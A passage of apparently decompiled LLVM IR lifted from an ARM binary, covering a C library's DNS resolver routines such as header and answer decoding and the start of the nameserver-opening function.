  %v7_1574c = icmp slt i32 %v6_15740, 12
  br i1 %v7_1574c, label %dec_label_pc_15a6c, label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %dec_label_pc_15730
  %v0_15750 = load i32, i32* @r7, align 4
  %v2_15758 = inttoptr i32 %v0_15750 to i8*
  %v3_15758 = call i32 @__decode_header(i8* %v2_15758, i32 %v2_15504)
  %v3_1575c = load i8, i8* %stack_var_-188, align 1
  %v4_1575c = sext i8 %v3_1575c to i32
  store i32 %v4_1575c, i32* @r6, align 4
  %v1_15760 = load i32, i32* @sb, align 4
  %v9_15760 = icmp eq i32 %v4_1575c, %v1_15760
  br i1 %v9_15760, label %dec_label_pc_15768, label %dec_label_pc_15a6c

dec_label_pc_15768:                               ; preds = %dec_label_pc_15750
  %v1_1576c = load i32, i32* @r4, align 4
  %v9_1576c = icmp eq i32 %tmp157, %v1_1576c
  br i1 %v9_1576c, label %dec_label_pc_15a6c, label %dec_label_pc_15774

dec_label_pc_15774:                               ; preds = %dec_label_pc_15768
  br i1 %v7_15778, label %dec_label_pc_15780, label %dec_label_pc_157fc

dec_label_pc_15780:                               ; preds = %dec_label_pc_15774
  %v9_15784 = icmp eq i32 %., %v1_1576c
  br i1 %v9_15784, label %dec_label_pc_1578c, label %dec_label_pc_157f0

dec_label_pc_1578c:                               ; preds = %dec_label_pc_15780
  store i32 %v2_15468, i32* @r5, align 4
  store i32 %v2_15468, i32* @r0, align 4
  %v1_157a4 = call i32 @__pthread_return_void()
  %v1_157b4 = call i32 @__pthread_return_0()
  store i32 %v2_15468, i32* @r0, align 4
  %v2_157c0 = load i32, i32* @global_var_29874.599, align 4
  %v1_157d0 = call i32 @__pthread_return_void()
  %v1_157d8 = add i32 %v2_157c0, -1
  store i32 %v1_157d8, i32* @r4, align 4
  %v5_157e0 = icmp slt i32 %v6_15acc, %v1_157d8
  br i1 %v5_157e0, label %.thread19, label %dec_label_pc_157f0

.thread19:                                        ; preds = %dec_label_pc_1578c
  %v7_157e0 = add i32 %v6_15acc, 1
  %v6_157e4 = load i32, i32* @r6, align 4
  store i32 %v6_157e4, i32* @sb, align 4
  br label %dec_label_pc_15b08.outer.backedge

dec_label_pc_157f0:                               ; preds = %dec_label_pc_1578c, %dec_label_pc_15780
  %v0_157f0 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_15820

dec_label_pc_157fc:                               ; preds = %dec_label_pc_15774
  br i1 %v2_157fc, label %dec_label_pc_15804, label %dec_label_pc_15a6c

dec_label_pc_15804:                               ; preds = %dec_label_pc_157fc
  br i1 %tmp198, label %dec_label_pc_15818, label %dec_label_pc_15830.preheader

dec_label_pc_15830.preheader:                     ; preds = %dec_label_pc_15804
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_15830

dec_label_pc_15818:                               ; preds = %dec_label_pc_15804
  %v0_15818 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_15820

dec_label_pc_15820:                               ; preds = %dec_label_pc_157f0, %dec_label_pc_15818
  %storemerge4 = phi i32 [ %v0_15818, %dec_label_pc_15818 ], [ %v0_157f0, %dec_label_pc_157f0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_15818 ], [ 1, %dec_label_pc_157f0 ]
  %v2_15820 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_15820, align 4
  br label %dec_label_pc_15b34

dec_label_pc_15828:                               ; preds = %dec_label_pc_15830
  %v2_15828 = call i32 @__length_question(i32 %v0_1583c, i32 %v0_15838)
  %v0_1582c = load i32, i32* @r5, align 4
  %v2_1582c = add i32 %v0_1582c, %v2_15828
  store i32 %v2_1582c, i32* @r5, align 4
  %v0_15834.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15830

dec_label_pc_15830:                               ; preds = %dec_label_pc_15830.preheader, %dec_label_pc_15828
  %v0_15838 = phi i32 [ 12, %dec_label_pc_15830.preheader ], [ %v2_1582c, %dec_label_pc_15828 ]
  %v0_15840 = phi i32 [ 0, %dec_label_pc_15830.preheader ], [ %v0_15834.pre, %dec_label_pc_15828 ]
  store i32 %v0_15838, i32* @r1, align 4
  %v0_1583c = load i32, i32* @r7, align 4
  store i32 %v0_1583c, i32* @r0, align 4
  %v1_15840 = add i32 %v0_15840, 1
  store i32 %v1_15840, i32* @r4, align 4
  %v5_15844 = icmp slt i32 %v0_15840, 1
  br i1 %v5_15844, label %dec_label_pc_15828, label %dec_label_pc_15848

dec_label_pc_15848:                               ; preds = %dec_label_pc_15830
  br label %dec_label_pc_159a4

dec_label_pc_1585c:                               ; preds = %bb205
  store i32 %v2_1585c, i32* @r4, align 4
  %v0_15860 = load i32, i32* @r7, align 4
  %v0_15868 = load i32, i32* @fp, align 4
  %v5_15870 = call i32 @__decode_answer(i32 %v0_15860, i32 %v0_15864, i32 %v0_15868, i32* nonnull %stack_var_-140)
  %v1_15874 = icmp slt i32 %v5_15870, 0
  br i1 %v1_15874, label %dec_label_pc_15880, label %dec_label_pc_1589c

dec_label_pc_15880:                               ; preds = %dec_label_pc_1585c
  %v2_15884 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_15884, label %dec_label_pc_15a6c, label %dec_label_pc_1588c

dec_label_pc_1588c:                               ; preds = %dec_label_pc_15880
  br i1 %v2_15890, label %dec_label_pc_15a6c, label %dec_label_pc_159b8

dec_label_pc_1589c:                               ; preds = %dec_label_pc_1585c
  %v2_158a0 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_158a0, label %dec_label_pc_15944, label %dec_label_pc_158a8

dec_label_pc_158a8:                               ; preds = %dec_label_pc_1589c
  %v0_158a8 = load i32, i32* @r8, align 4
  %v6_158ac = add i32 %v0_158a8, 36
  %v7_158ac = inttoptr i32 %v6_158ac to i32*
  %v8_158ac = load i32, i32* %v7_158ac, align 4
  store i32 %v8_158ac, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_1585c, i32* @r1, align 4
  store i32 %v0_158a8, i32* @r0, align 4
  %v0_158c8 = call i32 @memcpy()
  %v0_158cc = load i32, i32* @r8, align 4
  %v1_158cc = add i32 %v0_158cc, 4
  %v2_158cc = inttoptr i32 %v1_158cc to i32*
  %v3_158cc = load i32, i32* %v2_158cc, align 4
  %v7_158d0 = icmp eq i32 %v3_158cc, 24
  br i1 %v7_158d0, label %dec_label_pc_158f4, label %dec_label_pc_158d8

dec_label_pc_158d8:                               ; preds = %dec_label_pc_158a8
  %v1_158d8 = add i32 %v0_158cc, 28
  %v2_158d8 = inttoptr i32 %v1_158d8 to i32*
  %v3_158d8 = load i32, i32* %v2_158d8, align 4
  %v2_158dc = icmp eq i32 %v3_158d8, 0
  br i1 %v2_158dc, label %dec_label_pc_159b8, label %dec_label_pc_158e4

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158d8
  br i1 %v7_158e8, label %dec_label_pc_158f4, label %bb203

bb203:                                            ; preds = %dec_label_pc_158e4
  br i1 %v8_158ec, label %dec_label_pc_158f4, label %dec_label_pc_159b8

dec_label_pc_158f4:                               ; preds = %dec_label_pc_158e4, %bb203, %dec_label_pc_158a8
  %v9_158f8 = icmp eq i32 %v3_158cc, %arg2
  br i1 %v9_158f8, label %dec_label_pc_1590c, label %dec_label_pc_15900

dec_label_pc_15900:                               ; preds = %dec_label_pc_158f4
  %v1_15900 = inttoptr i32 %v0_158cc to i32*
  %v2_15900 = load i32, i32* %v1_15900, align 4
  store i32 %v2_15900, i32* @r0, align 4
  %v0_15904 = call i32 @free()
  br label %dec_label_pc_15990

dec_label_pc_1590c:                               ; preds = %dec_label_pc_158f4
  %v1_15914 = add i32 %v0_158cc, 16
  %v2_15914 = inttoptr i32 %v1_15914 to i32*
  %v3_15914 = load i32, i32* %v2_15914, align 4
  %v2_15918 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1591c = add i32 %v2_15918, -1
  %v1_15920 = add i32 %v3_15914, 4
  %v2_15924 = mul i32 %v1_15920, %v1_1591c
  %v1_15928 = add i32 %v0_158cc, 32
  %v2_15928 = inttoptr i32 %v1_15928 to i32*
  %v3_15928 = load i32, i32* %v2_15928, align 4
  %v2_15930 = add i32 %v0_158cc, 36
  %v3_15930 = inttoptr i32 %v2_15930 to i32*
  store i32 %v1_1591c, i32* %v3_15930, align 4
  %tmp294 = icmp ugt i32 %v2_15924, %v3_15928
  br i1 %tmp294, label %dec_label_pc_159b8, label %dec_label_pc_1590c.dec_label_pc_1598c_crit_edge

dec_label_pc_1590c.dec_label_pc_1598c_crit_edge:  ; preds = %dec_label_pc_1590c
  %v1_1598c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1598c

dec_label_pc_15944:                               ; preds = %dec_label_pc_1589c
  %v3_15944 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_15944, i32* @r0, align 4
  %v0_15948 = call i32 @free()
  br i1 %v9_15954, label %dec_label_pc_1595c, label %dec_label_pc_15990

dec_label_pc_1595c:                               ; preds = %dec_label_pc_15944
  %v0_1595c = load i32, i32* @r8, align 4
  %v1_1595c = add i32 %v0_1595c, 16
  %v2_1595c = inttoptr i32 %v1_1595c to i32*
  %v3_1595c = load i32, i32* %v2_1595c, align 4
  %v9_15964 = icmp eq i32 %v3_1595c, %tmp146
  br i1 %v9_15964, label %dec_label_pc_1596c, label %dec_label_pc_15a64

dec_label_pc_1596c:                               ; preds = %dec_label_pc_1595c
  %v1_1596c = add i32 %v0_1595c, 36
  %v2_1596c = inttoptr i32 %v1_1596c to i32*
  %v3_1596c = load i32, i32* %v2_1596c, align 4
  %v1_15970 = add i32 %v0_1595c, 28
  %v2_15970 = inttoptr i32 %v1_15970 to i32*
  %v3_15970 = load i32, i32* %v2_15970, align 4
  %v3_15974 = mul i32 %v3_1596c, %tmp146
  %v4_15974 = add i32 %v3_15970, %v3_15974
  store i32 %v4_15974, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_15980 = call i32 @memcpy()
  %v0_15984 = load i32, i32* @r8, align 4
  %v1_15984 = add i32 %v0_15984, 36
  %v2_15984 = inttoptr i32 %v1_15984 to i32*
  %v3_15984 = load i32, i32* %v2_15984, align 4
  %v1_15988 = add i32 %v3_15984, 1
  br label %dec_label_pc_1598c

dec_label_pc_1598c:                               ; preds = %dec_label_pc_1590c.dec_label_pc_1598c_crit_edge, %dec_label_pc_1596c
  %v1_1598c = phi i32 [ %v0_15984, %dec_label_pc_1596c ], [ %v1_1598c.pre, %dec_label_pc_1590c.dec_label_pc_1598c_crit_edge ]
  %storemerge5 = phi i32 [ %v1_15988, %dec_label_pc_1596c ], [ 0, %dec_label_pc_1590c.dec_label_pc_1598c_crit_edge ]
  %v2_1598c = add i32 %v1_1598c, 36
  %v3_1598c = inttoptr i32 %v2_1598c to i32*
  store i32 %storemerge5, i32* %v3_1598c, align 4
  br label %dec_label_pc_15990

dec_label_pc_15990:                               ; preds = %dec_label_pc_15944, %dec_label_pc_15900, %dec_label_pc_1598c
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_1598c ], [ 0, %dec_label_pc_15944 ], [ %stack_var_-212.2, %dec_label_pc_15900 ]
  %v1_15998 = add i32 %stack_var_-192.0, 1
  %v0_159a0 = load i32, i32* @r5, align 4
  %v2_159a0 = add i32 %v0_159a0, %v5_15870
  store i32 %v2_159a0, i32* @r5, align 4
  br label %dec_label_pc_159a4

dec_label_pc_159a4:                               ; preds = %dec_label_pc_15848, %dec_label_pc_15990
  %v0_15864 = phi i32 [ %v0_15838, %dec_label_pc_15848 ], [ %v2_159a0, %dec_label_pc_15990 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_15848 ], [ %stack_var_-212.1, %dec_label_pc_15990 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_15848 ], [ %v1_15998, %dec_label_pc_15990 ]
  %v2_159ac = sub i32 %stack_var_-192.0, %tmp155
  %v4_159ac = xor i32 %stack_var_-192.0, %tmp155
  %v5_159ac = xor i32 %v2_159ac, %stack_var_-192.0
  %v6_159ac = and i32 %v5_159ac, %v4_159ac
  %v5_159b0 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_159b0, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_159a4
  %v7_159b0 = load i32, i32* @fp, align 4
  %v8_159b0 = sub i32 %v0_15864, %v7_159b0
  %v10_159b0 = xor i32 %v7_159b0, %v0_15864
  %v11_159b0 = xor i32 %v8_159b0, %v0_15864
  %v12_159b0 = and i32 %v11_159b0, %v10_159b0
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_159a4, %bb204
  %v1_159b4.in = phi i32 [ %v6_159ac, %dec_label_pc_159a4 ], [ %v12_159b0, %bb204 ]
  %v0_159b4.in = phi i32 [ %v2_159ac, %dec_label_pc_159a4 ], [ %v8_159b0, %bb204 ]
  %v0_159b4 = icmp slt i32 %v0_159b4.in, 0
  %v1_159b4 = icmp slt i32 %v1_159b4.in, 0
  %v2_159b4 = xor i1 %v1_159b4, %v0_159b4
  br i1 %v2_159b4, label %dec_label_pc_1585c, label %dec_label_pc_159b8

dec_label_pc_159b8:                               ; preds = %dec_label_pc_1588c, %bb203, %dec_label_pc_1590c, %dec_label_pc_158d8, %bb205
  %v1_159bc = call i32 @__libc_close(i32 %v0_1569c)
  %v3_159c0 = load i32, i32* %stack_var_0, align 4
  %v2_159c4 = icmp eq i32 %v3_159c0, 0
  br i1 %v2_159c4, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_159b8
  %v1_159cc = load i32, i32* @r7, align 4
  %v3_159c8 = inttoptr i32 %v3_159c0 to i32*
  store i32 %v1_159cc, i32* %v3_159c8, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_159b8
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 88532, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_159c4, i32 ptrtoint (i32* @global_var_126e8.313 to i32))
  %v2_159d4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_159d4, i32* @r0, align 4
  store i32 %v2_15468, i32* @r4, align 4
  %v0_159dc = call i32 @free()
  store i32 %v2_15468, i32* @r0, align 4
  %v1_159f4 = call i32 @__pthread_return_void()
  %v1_15a04 = call i32 @__pthread_return_0()
  %v0_15a10 = load i32, i32* @r6, align 4
  %v3_15a10 = sdiv i32 %v0_15a10, 256
  %v0_15a14 = load i32, i32* @sl, align 4
  store i32 %v0_15a14, i32* @global_var_297a4.591, align 4
  store i32 %v2_15468, i32* @r0, align 4
  %v1_15a20 = trunc i32 %v3_15a10 to i8
  store i8 %v1_15a20, i8* @global_var_234f1.594, align 1
  %v1_15a24 = trunc i32 %v0_15a10 to i8
  store i8 %v1_15a24, i8* bitcast (i8** @global_var_234f0.593 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_15a34.605 to i32), i32* @lr, align 4
  %v1_15a30 = call i32 @__pthread_return_void()
  %v0_15bbc.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_15bbc

dec_label_pc_15a38:                               ; preds = %dec_label_pc_156cc, %dec_label_pc_156ec
  %v0_15a38 = load i32, i32* @sl, align 4
  %v1_15a38 = add i32 %v0_15a38, 1
  %v2_15a40 = srem i32 %v1_15a38, %arg3
  store i32 %v2_15a40, i32* @sl, align 4
  %v2_15a44 = icmp eq i32 %v2_15a40, 0
  br i1 %v2_15a44, label %dec_label_pc_15a4c, label %dec_label_pc_15b04.backedge

dec_label_pc_15a4c:                               ; preds = %dec_label_pc_15a38
  %v1_15a54 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_15b08.outer.backedge

dec_label_pc_15b08.outer.backedge:                ; preds = %dec_label_pc_15a4c, %dec_label_pc_15ae8, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_157e0, %.thread19 ], [ -1, %dec_label_pc_15ae8 ], [ -1, %dec_label_pc_15a4c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_15af0, %dec_label_pc_15ae8 ], [ %v1_15a54, %dec_label_pc_15a4c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_154ec.lr.ph, label %dec_label_pc_15b24

dec_label_pc_15a64:                               ; preds = %dec_label_pc_1595c
  %v1_15a64 = inttoptr i32 %v0_1595c to i32*
  %v2_15a64 = load i32, i32* %v1_15a64, align 4
  store i32 %v2_15a64, i32* @r0, align 4
  %v0_15a68 = call i32 @free()
  br label %dec_label_pc_15a6c

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_157fc, %dec_label_pc_15750, %dec_label_pc_1588c, %dec_label_pc_15880, %dec_label_pc_15768, %dec_label_pc_15730, %dec_label_pc_15a64
  br i1 %v2_15a70, label %dec_label_pc_15a78, label %dec_label_pc_15ad4

dec_label_pc_15a78:                               ; preds = %dec_label_pc_15a6c
  store i32 %v2_15468, i32* @r5, align 4
  store i32 %v2_15468, i32* @r0, align 4
  %v1_15a90 = call i32 @__pthread_return_void()
  %v1_15aa0 = call i32 @__pthread_return_0()
  %v2_15aac = load i32, i32* @global_var_29874.599, align 4
  store i32 %v2_15468, i32* @r0, align 4
  %v1_15abc = call i32 @__pthread_return_void()
  %v1_15ac4 = add i32 %v2_15aac, -1
  store i32 %v1_15ac4, i32* @r4, align 4
  %v5_15acc = icmp slt i32 %v6_15acc, %v1_15ac4
  br i1 %v5_15acc, label %.thread27, label %dec_label_pc_15ad4

.thread27:                                        ; preds = %dec_label_pc_15a78
  %v7_15acc = add i32 %v6_15acc, 1
  br label %dec_label_pc_15b04.backedge

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15a78, %dec_label_pc_15a6c
  %v0_15ad4 = load i32, i32* @sl, align 4
  %v1_15ad4 = add i32 %v0_15ad4, 1
  %v2_15adc = srem i32 %v1_15ad4, %arg3
  store i32 %v2_15adc, i32* @sl, align 4
  %v2_15ae0 = icmp eq i32 %v2_15adc, 0
  br i1 %v2_15ae0, label %dec_label_pc_15ae8, label %dec_label_pc_15b04.backedge

dec_label_pc_15ae8:                               ; preds = %dec_label_pc_15ad4
  %v1_15af0 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_15b08.outer.backedge

dec_label_pc_15b04.backedge:                      ; preds = %dec_label_pc_15a38, %dec_label_pc_15ad4, %.thread27
  %storemerge87 = phi i32 [ %v7_15acc, %.thread27 ], [ -1, %dec_label_pc_15ad4 ], [ -1, %dec_label_pc_15a38 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_154ec.lr.ph.preheader, label %dec_label_pc_15b24

dec_label_pc_154ec.lr.ph.preheader:               ; preds = %dec_label_pc_154ec.lr.ph.preheader.lr.ph, %dec_label_pc_15b04.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_154ec.lr.ph.preheader.lr.ph ], [ %v0_1569c, %dec_label_pc_15b04.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_154e4, %dec_label_pc_154ec.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_15b04.backedge ]
  %v0_15b04259 = phi i32 [ -1, %dec_label_pc_154ec.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_15b04.backedge ]
  br label %dec_label_pc_154ec.lr.ph

dec_label_pc_154ec.lr.ph:                         ; preds = %dec_label_pc_154ec.lr.ph.preheader, %dec_label_pc_15b08.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_1569c, %dec_label_pc_15b08.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_154ec.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_15b08.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_154ec.lr.ph.preheader ]
  %v6_15acc = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_15b08.outer.backedge ], [ %v0_15b04259, %dec_label_pc_154ec.lr.ph.preheader ]
  %v1_15594 = icmp slt i32 %v6_15acc, 0
  %v4_155d0 = mul i32 %v6_15acc, 4
  %v5_155d0 = add i32 %v4_155d0, ptrtoint (i32* @global_var_29854.603 to i32)
  %v6_155d0 = inttoptr i32 %v5_155d0 to i32*
  br label %dec_label_pc_154ec

dec_label_pc_15b18:                               ; preds = %bb195, %.thread8, %dec_label_pc_15444, %dec_label_pc_15438
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_15b24

dec_label_pc_15b24:                               ; preds = %dec_label_pc_15454, %dec_label_pc_15b04.backedge, %dec_label_pc_15b08.outer.backedge, %bb200, %dec_label_pc_155dc, %dec_label_pc_15b08.backedge, %dec_label_pc_15b18
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_15b18 ], [ %v0_1569c, %dec_label_pc_15b08.backedge ], [ %v1_154f4, %dec_label_pc_155dc ], [ %v1_154f4, %bb200 ], [ %v0_1569c, %dec_label_pc_15b08.outer.backedge ], [ -1, %dec_label_pc_15454 ], [ %v0_1569c, %dec_label_pc_15b04.backedge ]
  %v0_15b24 = call i32 @__GI___h_errno_location()
  %v2_15b2c = inttoptr i32 %v0_15b24 to i32*
  store i32 -1, i32* %v2_15b2c, align 4
  %v0_15b30 = load i32, i32* @sb, align 4
  store i32 %v0_15b30, i32* @r6, align 4
  br label %dec_label_pc_15b34

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15820, %dec_label_pc_15b24
  %v1_15b3c = phi i32 [ %stack_var_-216.2, %dec_label_pc_15b24 ], [ %v0_1569c, %dec_label_pc_15820 ]
  %v7_15b38 = icmp eq i32 %v1_15b3c, -1
  br i1 %v7_15b38, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_15b34
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_15b34, %bb208
  store i32 88900, i32* @lr, align 4
  %v1_15b40 = xor i1 %v7_15b38, true
  call void @__pseudo_cond_branch(i1 %v1_15b40, i32 ptrtoint (i32* @global_var_f618.596 to i32))
  %v2_15b44 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_15b44, i32* @r0, align 4
  %v0_15b48 = call i32 @free()
  %v0_15b4c = load i32, i32* @r7, align 4
  store i32 %v0_15b4c, i32* @r0, align 4
  %v0_15b50 = call i32 @free()
  %v0_15b54 = load i32, i32* @sl, align 4
  %v7_15b54 = icmp eq i32 %v0_15b54, -1
  br i1 %v7_15b54, label %bb210, label %dec_label_pc_15b60

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_15bbc

dec_label_pc_15b60:                               ; preds = %bb209
  %v2_15b60 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_15b60, i32* @r0, align 4
  %v1_15b78 = call i32 @__pthread_return_void()
  %v1_15b88 = call i32 @__pthread_return_0()
  %v0_15b94 = load i32, i32* @r6, align 4
  %v3_15b94 = sdiv i32 %v0_15b94, 256
  %v0_15b98 = load i32, i32* @sl, align 4
  store i32 %v0_15b98, i32* @global_var_297a4.591, align 4
  store i32 %v2_15b60, i32* @r0, align 4
  %v1_15ba4 = trunc i32 %v3_15b94 to i8
  store i8 %v1_15ba4, i8* @global_var_234f1.594, align 1
  %v1_15ba8 = trunc i32 %v0_15b94 to i8
  store i8 %v1_15ba8, i8* bitcast (i8** @global_var_234f0.593 to i8*), align 4
  store i32 89016, i32* @lr, align 4
  %v1_15bb4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_15bbc

dec_label_pc_15bbc:                               ; preds = %bb210, %bb207, %dec_label_pc_15b60
  %v0_15bbc = phi i32 [ %v0_15b54, %bb210 ], [ %v0_15bbc.pre, %bb207 ], [ -1, %dec_label_pc_15b60 ]
  store i32 %v3_153f0, i32* @r4, align 4
  store i32 %v6_153f0, i32* @r5, align 4
  store i32 %v9_153f0, i32* @r6, align 4
  store i32 %v12_153f0, i32* @r7, align 4
  store i32 %v15_153f0, i32* @r8, align 4
  store i32 %v18_153f0, i32* @sb, align 4
  store i32 %v21_153f0, i32* @sl, align 4
  ret i32 %v0_15bbc

; uselistorder directives
  uselistorder i32 %v0_15b94, { 1, 0 }
  uselistorder i32 %v0_15b54, { 1, 0 }
  uselistorder i1 %v7_15b38, { 1, 0 }
  uselistorder i32 %v6_15acc, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_15a10, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_15864, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1595c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1591c, { 1, 0 }
  uselistorder i32 %v0_1583c, { 1, 0 }
  uselistorder i32 %v0_15840, { 1, 0 }
  uselistorder i32 %v6_15740, { 1, 0 }
  uselistorder i32 %v0_1569c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_15608, { 1, 0 }
  uselistorder i32 %v2_155a8, { 1, 0 }
  uselistorder i32 %v1_15520, { 1, 2, 0 }
  uselistorder i1 %v7_154f0, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_154f4, { 1, 2, 0 }
  uselistorder i32 %v0_154e4, { 1, 0 }
  uselistorder i32 %v2_15468, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 11, 12, 17, 16, 15, 14, 13, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 8, 7, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 12 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32 ()* @socket, { 1, 9, 7, 6, 5, 4, 3, 2, 8, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_234f1.594, { 2, 1, 0 }
  uselistorder i32 512, { 3, 8, 2, 9, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_15bbc, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_15b34, { 1, 0 }
  uselistorder label %dec_label_pc_15b24, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_15b18, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_154ec.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15b04.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15a6c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_15b08.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15a38, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_159b8, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_159a4, { 1, 0 }
  uselistorder label %dec_label_pc_15990, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1598c, { 1, 0 }
  uselistorder label %dec_label_pc_158f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15830, { 1, 0 }
  uselistorder label %dec_label_pc_15820, { 1, 0 }
  uselistorder label %dec_label_pc_15b08.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15688, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_155dc, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15bc8:
  %v0_15bc8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15bc8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15bc8
  %v5_15bc8 = mul i32 %arg2, 256
  %v6_15bc8 = and i32 %v5_15bc8, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15bc8, %bb
  %v10_15bf8 = phi i32 [ %arg1, %dec_label_pc_15bc8 ], [ %v6_15bc8, %bb ]
  ret i32 %v10_15bf8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15bfc = load i32, i32* @r4, align 4
